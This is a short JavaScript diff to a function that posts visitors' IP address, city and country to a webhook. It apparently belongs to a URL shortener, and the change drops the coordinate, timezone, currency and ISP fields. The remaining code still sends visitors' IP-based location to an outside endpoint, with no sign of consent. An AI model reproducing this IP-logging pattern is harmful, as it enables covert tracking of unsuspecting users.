@@ -11,13 +11,8 @@ async function sendUserDataToWebhook() {
     fields: [
       { name: "IP Address", value: data.ip || 'N/A', inline: true },
       { name: "City", value: data.city || 'N/A', inline: true },
-      { name: "Country", value: data.country_name || 'N/A', inline: true },
-      { name: "Latitude", value: data.latitude || 'N/A', inline: true },
-      { name: "Longitude", value: data.longitude || 'N/A', inline: true },
-      { name: "Timezone", value: data.timezone || 'N/A', inline: true },
-      { name: "Currency", value: data.currency || 'N/A', inline: true },
-      { name: "ISP", value: data.isp || 'N/A', inline: true }
-    ],
+      { name: "Country", value: data.country_name || 'N/A', inline: true }
+      ],
     footer: {
       text: "CD Hub - URL Shortener"
     }
